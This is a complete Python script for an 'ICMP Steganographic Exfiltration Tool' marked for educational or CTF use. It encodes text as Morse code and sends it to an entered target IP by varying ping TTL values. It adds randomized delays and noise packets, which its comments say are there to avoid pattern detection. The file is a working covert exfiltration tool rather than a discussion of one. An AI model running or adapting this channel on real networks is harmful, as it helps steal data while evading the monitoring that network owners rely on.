#!/usr/bin/env python3
import subprocess
import random
import time
import sys
import platform

PURPLE = '\033[95m'
RESET = '\033[0m'

# Extended morse code dictionary
MORSE_CODE = {
    'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.',
    'F': '..-.', 'G': '--.', 'H': '....', 'I': '..', 'J': '.---',
    'K': '-.-', 'L': '.-..', 'M': '--', 'N': '-.', 'O': '---',
    'P': '.--.', 'Q': '--.-', 'R': '.-.', 'S': '...', 'T': '-',
    'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-', 'Y': '-.--',
    'Z': '--..', '0': '-----', '1': '.----', '2': '..---', '3': '...--',
    '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
    '9': '----.', ',': '--..--', '.': '.-.-.-', ' ': '/', '_': '..--.-',
    '?': '..--..', ';': '-.-.-.', ':': '---...', "'": '.----.',
    '-': '-....-', '@': '.--.-.', '!': '-.-.--', '=': '-...-'
}

# TTL ranges for steganography (no gaps for reliable decoding)
TTL_RANGES = {
    '.': (32, 64),    # Dot
    '-': (65, 96),    # Dash  
    '|': (97, 128),   # Letter separator
    '/': (129, 160),  # Word separator
    'jitter': (161, 192)  # Noise/padding packets
}

def encode_message(message):
    """Encode message to morse with letter separators"""
    morse = []
    for char in message.upper():
        if char in MORSE_CODE:
            morse.append(MORSE_CODE[char])
    return '|'.join(morse)  # Separate letters with |

def get_ping_command(ttl, dest):
    """Return platform-specific ping command"""
    system = platform.system()
    
    if system == 'Windows':
        return ['ping', '-n', '1', '-i', str(ttl), '-w', '1000', dest]
    else:  # Linux/Mac
        return ['ping', '-c', '1', '-t', str(ttl), '-W', '1', dest]

def send_packet(dest, char, verbose=False):
    """Send single ICMP packet with encoded TTL"""
    if char not in TTL_RANGES:
        return False
    
    # Randomize TTL within range for this character
    ttl_min, ttl_max = TTL_RANGES[char]
    ttl = random.randint(ttl_min, ttl_max)
    
    try:
        cmd = get_ping_command(ttl, dest)
        result = subprocess.run(cmd, capture_output=True, timeout=2)
        
        if verbose:
            status = "✓" if result.returncode == 0 else "✗"
            print(f"[{status}] Sent '{char}' with TTL={ttl}")
        
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        if verbose:
            print(f"[!] Timeout for TTL={ttl}")
        return False

def add_jitter_packets(dest, num_packets=2):
    """Send noise packets to avoid pattern detection"""
    for _ in range(random.randint(1, num_packets)):
        send_packet(dest, 'jitter', verbose=False)

def exfiltrate(message, dest, jitter=True, delay_range=(0.1, 0.5), verbose=True):
    """
    Send message via ICMP steganography
    
    Args:
        message: Text to exfiltrate
        dest: Destination IP
        jitter: Add noise packets between transmissions
        delay_range: Random delay between packets (seconds)
        verbose: Print progress
    """
    morse = encode_message(message)
    
    if verbose:
        print(f"[*] Encoding: {message}")
        print(f"[*] Morse: {morse}")
        print(f"[*] Total packets: {len(morse)}")
        print(f"[*] Target: {dest}\n")
    
    success_count = 0
    
    for i, char in enumerate(morse):
        # Random delay between packets to avoid detection
        time.sleep(random.uniform(*delay_range))
        
        if send_packet(dest, char, verbose):
            success_count += 1
        
        # Occasionally inject noise packets
        if jitter and random.random() < 0.15:  # 15% chance
            add_jitter_packets(dest, num_packets=1)
        
        # Progress indicator
        if verbose and (i + 1) % 10 == 0:
            print(f"[*] Progress: {i+1}/{len(morse)} packets")
    
    if verbose:
        print(f"\n{PURPLE}[+]{RESET} Complete: {success_count}/{len(morse)} packets sent")

def decode_morse(morse_string):
    """Helper function to decode morse back to text"""
    reverse_code = {v: k for k, v in MORSE_CODE.items()}
    letters = morse_string.split('|')
    return ''.join(reverse_code.get(letter, '?') for letter in letters)


if __name__ == '__main__':
    
    
    print(f"""{PURPLE}
       ╔╦╗╔╦╗╦    ╦ ╦╦ ╦╦╔═╗╔═╗╔═╗╦═╗
        ║  ║ ║    ║║║╠═╣║╚═╗╠═╝║╣ ╠╦╝
        ╩  ╩ ╩═╝  ╚╩╝╩ ╩╩╚═╝╩  ╚═╝╩╚═

╔═══════════════════════════════════════════╗
║   ICMP Steganographic Exfiltration Tool   ║
║       For Educational/CTF Use Only        ║
╚═══════════════════════════════════════════╝
    {RESET}""")
   
    TARGET = input(f"{PURPLE}[+]{RESET} Enter target IP: ")
    MESSAGE = input(f"{PURPLE}[+]{RESET} Enter secret message: ")

    if len(sys.argv) > 1:
        MESSAGE = ' '.join(sys.argv[1:])

    # Test decode function
    test_morse = encode_message(MESSAGE)
    decoded = decode_morse(test_morse)
    print(f"[TEST] Encode/Decode: '{MESSAGE}' -> '{decoded}'\n")
    
    try:
        exfiltrate(
            message=MESSAGE,
            dest=TARGET,
            jitter=True,          # Add noise packets
            delay_range=(0.2, 0.8),  # Random 200-800ms delay
            verbose=True
        )
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")
